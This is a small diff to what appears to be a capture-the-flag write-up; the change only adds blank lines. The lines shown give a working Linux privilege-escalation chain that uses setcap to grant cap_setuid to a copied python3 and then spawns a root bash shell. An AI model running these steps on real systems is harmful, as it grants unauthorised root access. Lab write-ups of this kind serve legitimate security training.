@@ -66,7 +66,9 @@ we can find binary with SUID perm
 lets use the /sbin/setcap so..
 
 `cp /usr/bin/python3 /home/annie/python3`
+
 `setcap cap_setuid+ep /home/annie/python3`
+
 `./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
 
 now we got root and:
